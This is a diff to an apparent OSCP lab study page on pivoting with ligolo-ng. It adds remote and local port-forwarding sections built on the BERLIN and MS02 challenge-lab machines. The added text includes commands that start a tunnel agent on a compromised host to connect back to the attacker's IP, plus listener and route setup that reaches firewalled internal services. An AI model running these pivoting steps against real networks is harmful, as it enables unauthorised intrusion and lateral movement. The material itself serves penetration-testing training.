@@ -87,7 +87,7 @@ I assume I have compromised a victim machine. In this instance the shell on the 
 To launch the agent I simple use:
 
 ```
-C:\Windows\Temp\ligolo_agent.exe -connect 192.168.45.154:5984 -ignore-cert
+C:\Windows\Temp\ligolo_agent.exe -connect 192.168.45.154:5985 -ignore-cert
 ```
 
 <figure><img src="../../.gitbook/assets/LigoloNg-AgentLaunch.png" alt=""><figcaption></figcaption></figure>
@@ -138,15 +138,17 @@ Once set up, I can simply use the tunnel just by addressing traffic to the `172.
 
 This makes it very easy to work with. I have yet to find a type of traffic I cannot send over this tunnel.
 
-### Port Forwarding
+## Port Forwarding
+
+### Remote Port Forwarding
 
 Consider a scenario where a victim machine is the pivot point between the external and internal networks such as this:
 
 <figure><img src="../../.gitbook/assets/LigoloNg-PivotDiagram.png" alt=""><figcaption><p>Pivot to internal</p></figcaption></figure>
 
-The `ligolo_ng` agent would be running on the `PIVOTE` machine in this diagram. proxy would be running on the attacker's machine, `MSF`. This works perfectly for traffic flowing `MSF` -> `TARGET`. However it may not be possible for `TARGET` to reach `MSF`. if `TARGET` does not possess a route to the external network/Internet. If TARGET is only routed to other `TARGET` machines and `PIVOTE` but traffic cannot exit that subnet, an attacker running a shell on `TARGET` would not be able to download tools from `MSF` because it is unreachable.
+The `ligolo-ng` agent would be running on the `PIVOTE` machine in this diagram. proxy would be running on the attacker's machine, `MSF`. This works perfectly for traffic flowing `MSF` -> `TARGET`. However it may not be possible for `TARGET` to reach `MSF`. if `TARGET` does not possess a route to the external network/Internet. If TARGET is only routed to other `TARGET` machines and `PIVOTE` but traffic cannot exit that subnet, an attacker running a shell on `TARGET` would not be able to download tools from `MSF` because it is unreachable.
 
-Fortunately, ligolo\_ng has this situation covered. From the proxy shell session (on MSF) the attacker can remotely add a listener on `PIVOTE` that would allow traffic to flow back to MSF.
+Fortunately, `ligolo-ng` has this situation covered. From the proxy shell session (on `MSF`) the attacker can remotely add a listener on `PIVOTE` that would allow traffic to flow back to `MSF`.
 
 ```
 listener_add --addr <listen_interface>:<listen_port> --to <dest_ip>:<dest_port>
@@ -171,7 +173,7 @@ listener_add --addr 0.0.0.0:8000 --to 192.168.45.154:80
 
 <figure><img src="../../.gitbook/assets/LigoloNg-ListenerAdd.png" alt=""><figcaption><p>Listener setup commands</p></figcaption></figure>
 
-After execution I can see the listener at port 8000 from my shell session on MS01:
+After execution I can see the listener at port 8000 from my shell session on `MS01`:
 
 <figure><img src="../../.gitbook/assets/LigoloNg-PortForward-ListeningPortAgent.png" alt=""><figcaption><p>Viewing the listener on the victim</p></figcaption></figure>
 
@@ -182,6 +184,72 @@ After the listener is set up I can use it from `MS02` by attempting to access my
 <figure><img src="../../.gitbook/assets/LigoloNg-PortForward-Download.png" alt=""><figcaption><p>Successful download with port forward</p></figcaption></figure>
 
 The same listener can be used to upload files back to my HTTP server.
+
+To see this in action please refer to the OSCP A [`MS02` writeup](../../challenge-labs/lab-4-oscp-a/domain-machines/ms02.md#privilege-escalation).
+
+### Local Port Forwarding
+
+The following is loosely based on [this](https://medium.com/@Thigh\_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9) blog post and [this](https://medium.com/@Poiint/htb-magic-write-up-7141b34c66d9) HTB machine writeup where local port forwarding is used.
+
+My specific example is from the OSCP B challenge lab's [`BERLIN` machine](../../challenge-labs/lab-5-oscp-b/standalone/berlin.md#local-port-forwarding-with-ligolo-ng).
+
+This machine has some network services that are only accessible from the internal interface. One at port 8000 which is only listening on `127.0.0.1` and one at port 5000 that is fire-walled from the outside but reachable from the machine itself. For this example, I have a user-level shell as `dev` and am able to run basic commands on the machine including `netstat`:
+
+<figure><img src="../../.gitbook/assets/BERLIN-LNG-Netstat.png" alt=""><figcaption><p>netstat from user shell</p></figcaption></figure>
+
+#### Starting the Agent
+
+I download the agent software to `/tmp/lng_agent`. I connect it back to my machine at `192.168.45.157:8443`:
+
+{% code overflow="wrap" %}
+```bash
+/tmp/lng_agent -connect 192.168.45.157:8443 -ignore-cert &
+```
+{% endcode %}
+
+* `&` is used to run the command in the background so I do not lose my shell
+
+<figure><img src="../../.gitbook/assets/BERLIN-LNG-AgentBackground.png" alt=""><figcaption><p>Starting the agent in bash</p></figcaption></figure>
+
+#### Local Forward Configuration
+
+ligolo-ng uses the `240.0.0.1` IP address to route traffic locally through a tunnel. To configure the port forward I will:
+
+1. Create an interface (called `berlin`)
+2. Start a tunnel to the `BERLIN` machine
+3. Add a route for `240.0.0.1` to the `berlin` tunnel
+
+The interface is created in the proxy session with:
+
+```
+interface_create --name "berlin"
+```
+
+This is when I actually [started the agent](ligolo-ng.md#starting-the-agent) on the victim. Then I navigated to the session and started a tunnel:
+
+```
+tunnel_start --tun "berlin"
+```
+
+Lastly I added the route:
+
+```
+add_route --name "berlin" --route 240.0.0.1/32
+```
+
+* `240.0.0.1/32` is used because `ligolo-ng` requires CIDR notation
+
+<figure><img src="../../.gitbook/assets/BERLIN-LNG-ProxyLocalPortForwardConfig.png" alt=""><figcaption><p>Configuring the route from proxy</p></figcaption></figure>
+
+#### Using the Forward
+
+And now I am able to access the local interface via the IP address `240.0.0.1`:
+
+<figure><img src="../../.gitbook/assets/BERLIN-LNG-InternalExternallyAccessible.png" alt=""><figcaption><p>Service externally accessible</p></figcaption></figure>
+
+The left half shows accessing the service at port 5000 from the shell running on BERLIN as dev. The right half shows accessing the same service from the outside via the ligolo-ng 240.0.0.1 route. The service was inaccessible without the forward.
+
+More context for the usage of this port forward can be found in the [`BERLIN` writeup](../../challenge-labs/lab-5-oscp-b/standalone/berlin.md#exploiting).
 
 ## Tear-down
 
